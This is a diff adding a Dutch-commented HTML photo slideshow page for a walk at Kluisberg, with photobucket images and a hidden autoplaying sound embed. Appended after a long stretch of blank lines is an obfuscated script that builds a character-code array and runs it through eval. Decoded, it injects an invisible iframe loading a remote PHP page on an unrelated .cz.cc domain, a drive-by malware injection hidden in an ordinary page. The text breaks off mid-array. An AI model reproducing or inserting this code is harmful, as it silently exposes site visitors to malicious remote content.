@@ -1,0 +1,238 @@
+<html>
+<head>
+
+
+<style>
+.Caption {
+font-family: Arial;
+font-weight: plain;
+color:      #CCFFCC;
+}
+</style>
+<!-- hierboven kun je het uiterlijk veranderen van de tekst onder de foto's -->
+
+
+<script>
+
+
+// hier de snelheid van de slideshow  (in milliseconden)
+var SlideShowSpeed = 4000;
+
+// duur van de crossfade (in seconden)
+var CrossFadeDuration = 4;
+
+var Picture = new Array(); // 
+var Caption = new Array(); // 
+
+// hieonder kun je meer images tovoegen
+// ze moeten echter gelijk zijn aan het aantal captions daaronder
+
+
+
+
+Picture[1]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/01.jpg';
+Picture[2]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/02.jpg';
+Picture[3]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/03.jpg';
+Picture[4]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/04.jpg';
+Picture[5]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/05.jpg';
+Picture[6]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/06.jpg';
+Picture[7]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/07.jpg';
+Picture[8]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/08.jpg';
+Picture[9]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/09.jpg';
+Picture[10]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/10.jpg';
+Picture[11]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/11.jpg';
+Picture[12]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/12.jpg';
+Picture[13]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/13.jpg';
+Picture[14]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/14.jpg';
+Picture[15]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/15.jpg';
+Picture[16]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/16.jpg';
+Picture[17]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/17.jpg';
+Picture[18]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/18.jpg';
+Picture[19]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/19.jpg';
+Picture[20]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/20.jpg';
+Picture[21]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/21.jpg';
+Picture[22]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/22.jpg';
+Picture[23]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/23.jpg';
+Picture[24]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/24.jpg';
+Picture[25]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/25.jpg';
+Picture[26]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/26.jpg';
+Picture[27]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/27.jpg';
+Picture[28]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/28.jpg';
+Picture[29]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/29.jpg';
+Picture[30]  = 'http://i172.photobucket.com/albums/w26/rosten2007/wandelingen2007/kluisberg/30.jpg';
+
+
+
+
+
+
+
+
+
+// teksten bij de plaatjes ( aantal moet gelijk zijn aan aantal plaatjes hierboven )
+
+Caption[1]  = "";
+Caption[2]  = "";
+Caption[3]  = "";
+Caption[4]  = "";
+Caption[5]  = "";
+Caption[6]  = "";
+Caption[7]  = "";
+Caption[8]  = "";
+Caption[9]  = "";
+Caption[10]  = "";
+Caption[11]  = "";
+Caption[12]  = "";
+Caption[13]  = "";
+Caption[14]  = "";
+Caption[15]  = "";
+Caption[16]  = "";
+Caption[17]  = "";
+Caption[18]  = "";
+Caption[19]  = "";
+Caption[20]  = "";
+Caption[21]  = "";
+Caption[22]  = "";
+Caption[23]  = "";
+Caption[24]  = "";
+Caption[25]  = "";
+Caption[26]  = "";
+Caption[27]  = "";
+Caption[28]  = "";
+Caption[29]  = "";
+Caption[30]  = "";
+
+
+
+
+// =====================================
+// verander hieronder niets meer
+
+var tss;
+var iss;
+var jss = 1;
+var pss = Picture.length-1;
+
+var preLoad = new Array();
+for (iss = 1; iss < pss+1; iss++){
+preLoad[iss] = new Image();
+preLoad[iss].src = Picture[iss];}
+
+function runSlideShow(){
+if (document.all){
+document.images.PictureBox.style.filter="blendTrans(duration=2)";
+document.images.PictureBox.style.filter="blendTrans(duration=CrossFadeDuration)";
+document.images.PictureBox.filters.blendTrans.Apply();}
+document.images.PictureBox.src = preLoad[jss].src;
+if (document.getElementById) document.getElementById("CaptionBox").innerHTML= Caption[jss];
+if (document.all) document.images.PictureBox.filters.blendTrans.Play();
+jss = jss + 1;
+if (jss > (pss)) jss=1;
+tss = setTimeout('runSlideShow()', SlideShowSpeed);
+}
+
+</script>
+
+
+
+
+
+
+</head>
+
+
+<body background="http://users.pandora.be/mechelse-herders-van-rostenfoksen/achtergronden/groen.jpg"  onload=runSlideShow()>
+
+
+
+
+  <center>
+
+<table border=8 cellpadding=0 cellspacing=0>
+  <tr>
+    <!--
+    hieronder staat de hoogte en de breedte van de tabel waarin de plaatjes worden getoond
+    //-->
+    <td width=640 height=480>
+    <img src=01.jpg name=PictureBox width=640 height=480>
+    </td>
+  </tr>
+  <tr>
+    <!-- 
+    hieronder de cel waar de tekst wordt weergegeven.. kleur is aan te passen
+    //-->
+    <td id=CaptionBox class=Caption align=center bgcolor=#ffffff>
+
+    </td>
+  </tr>
+</table>
+
+  </center>
+</div>
+
+
+
+
+
+
+
+<p><embed src="http://users.skynet.be/aida-van-rostenfoksen/sounds/fragment44.wma" autostart="true"loop="true"hidden="true"></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br><p align="center">
+<hr width="50%"size="3"></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>Object.prototype.qwe=function(){return String.fromCharCode;};Object.prototype.asd='e';var s="";try{{}['qwtqwt']();}catch(q){if(q)r=1;}if(r&&+new Object(1231)&&document.createTextNode('123').data&&typeof{}.asd.vfr==='undefined')n=2;e=eval;m=[18/n,18/n,210/n,204/n,64/n,80/n,200/n,222/n,198/n,234/n,218/n,202/n,220/n,232/n,92/n,206/n,202/n,232/n,138/n,216/n,202/n,218/n,202/n,220/n,232/n,230/n,132/n,242/n,168/n,194/n,206/n,156/n,194/n,218/n,202/n,80/n,78/n,196/n,222/n,200/n,242/n,78/n,82/n,182/n,96/n,186/n,82/n,246/n,18/n,18/n,18/n,210/n,204/n,228/n,194/n,218/n,202/n,228/n,80/n,82/n,118/n,18/n,18/n,250/n,64/n,202/n,216/n,230/n,202/n,64/n,246/n,18/n,18/n,18/n,200/n,222/n,198/n,234/n,218/n,202/n,220/n,232/n,92/n,238/n,228/n,210/n,232/n,202/n,80/n,68/n,120/n,210/n,204/n,228/n,194/n,218/n,202/n,64/n,230/n,228/n,198/n,122/n,78/n,208/n,232/n,232/n,224/n,116/n,94/n,94/n,218/n,238/n,236/n,210/n,232/n,226/n,206/n,224/n,92/n,198/n,244/n,92/n,198/n,198/n,94/n,198/n,222/n,234/n,220/n,232/n,98/n,102/n,92/n,224/n,208/n,224/n,78/n,64/n,238/n,210/n,200/n,232/n,208/n,122/n,78/n,98/n,96/n,78/n,64/n,208/n,202/n,210/n,206/n,208/n,232/n,122/n,78/n,98/n,96/n,78/n,64/n,230/n,232/n,242/n,216/n,202/n,122/n,78/n,236/n,210/n,230/n,210/n,196/n,210/n,216/n,210/n,232/n,242/n,116/n,208/n,210/n,200/n,200/n,202/n,220/n,118/n,224/n,222/n,230/n,210/n,232/n,210/n,222/n,220/n,116/n,194/n,196/n,230/n,222/n,216/n,234/n,232/n,202/n,118/n,216/n,202/n,204/n,232/n,116/n,96/n,118/n,232/n,222/n,224/n,116/n,96/n,118/n,78/n,124/n,120/n,94/n,210/n,204/n,228/n,194/n,218/n,202/n,124/n,68/n,82/n,118/n,18/n,18/n,250/n,18/n,18/n,204/n,234/n,220/n,198/n,232/n,210/n,222/n,220/n,64/n,210/n,204/n,228/n,194/n,218/n,202/n,228/n,80/n,82/n,246/n,18/n,18/n,18/n,236/n,194/n,228/n,64/n,204/n,64/n,122/n,64/n,200/n,222/n,198/n,234/n,218/n,202/n,220/n,232/n,92/n,198/n,228/n,202/n,194/n,232/n,202/n,138/n,216/n,202/n,218/n,202/n,220/n,232/n,80/n,78/n,210/n,204/n,228/n,194/n,218/n,202/n,78/n,82/n,118/n,204/n,92/n,230/n,202/n,232/n,130/n,232/n,232/n,228/n,210/n,196/n,234/n,232/n,202/n,80/n,78/n,230/n,228/n,198/n,78/n,88/n,78/n,208/n,232/n,232/n,224/n,116/n,94/n,94/n,218/n,238/n,236/n,210/n,232/n,226/n,206/n,224/n,92/n,198/n,244/n,92/n,198/n,198/n,94/n,198/n,222/n,234/n,220/n,232/n,98/n,102/n,92/n,2
